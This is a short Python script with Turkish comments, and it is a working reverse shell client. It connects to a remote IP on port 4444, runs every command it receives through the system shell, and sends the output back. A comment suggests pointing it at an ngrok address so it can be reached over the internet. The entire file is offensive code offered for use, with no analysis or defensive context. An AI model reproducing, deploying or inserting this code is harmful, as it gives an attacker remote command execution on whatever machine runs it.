import socket
import subprocess
import os

server_ip = "10.0.2.15"  # Kendi IP veya ngrok adresin
port = 4444

client = socket.socket()
client.connect((server_ip, port))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    client.send(output or b"[+] Boş çıktı")

client.close()
